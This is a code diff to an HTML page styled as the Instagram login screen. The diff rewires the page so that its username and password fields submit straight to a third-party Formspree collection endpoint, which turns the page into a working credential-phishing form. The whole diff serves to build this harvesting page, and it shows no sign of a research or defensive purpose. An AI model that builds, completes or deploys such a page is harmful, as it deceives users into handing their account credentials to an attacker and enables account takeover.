@@ -89,34 +89,19 @@
 </style>
 </head>
 <body>
-  <div class="wrapper">
+ <div class="wrapper">
     <div class="logo">Instagram</div>
-    <!-- modify this form HTML and place wherever you want your form -->
-<form
-  action="https://formspree.io/f/xanonegn"
-  method="POST"
->
-  <label>
-    Your email:
-    <input type="email" name="email">
-  </label>
-  <label>
-    Your message:
-    <textarea name="message"></textarea>
-  </label>
-  <!-- your other form fields go here -->
-  <button type="submit">Send</button>
-</form>
-    <input type="text" id="username" placeholder="Phone number, username, or email">
-    <input type="password" id="password" placeholder="Password">
-    <div class="wrongPass"></div>
-    <button class="logBtn" onclick="login(); clearData()">Log In</button>
+    <form action="https://formspree.io/f/xanonegn" method="POST">
+      <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" id="password" placeholder="Password" required>
+      <div class="wrongPass"></div>
+      <button class="logBtn" type="submit">Log In</button>
+    </form>
     <div class="divider">OR</div>
     <div class="signup-link">
       Don't have an account? <a href="#">Sign up</a>
     </div>
   </div>
-
   <script src="script.js">
   </script>
 </body>
